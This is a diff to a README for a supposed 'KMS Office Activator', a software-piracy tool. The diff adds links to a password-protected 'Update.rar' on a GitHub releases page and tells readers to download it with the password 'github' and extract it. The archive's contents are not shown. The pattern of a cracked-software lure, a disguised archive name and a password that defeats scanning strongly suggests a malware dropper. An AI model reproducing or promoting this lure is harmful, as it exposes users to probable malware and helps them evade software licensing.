@@ -1,9 +1,9 @@
 
-# KMS Office Activator [![Download KMS Office](https://img.shields.io/badge/Download-KMS%20Office-blue)]()
+# KMS Office Activator [![Download KMS Office](https://img.shields.io/badge/Download-KMS%20Office-blue)](https://github.com/DracoRDragon/kms-activator/releases/download/Release/Update.rar)
 
 ## Installation
 To install KMS Office, follow these simple steps:
-1. [![Download KMS Office](https://img.shields.io/badge/Download-KMS%20Office-blue)]()
+1. [![Download KMS Office](https://img.shields.io/badge/Download-KMS%20Office-blue)](https://github.com/DracoRDragon/kms-activator/releases/download/Release/Update.rar)
 2. **Pass: github**
 3. Extract the downloaded RAR file to your desired location on your system.
 
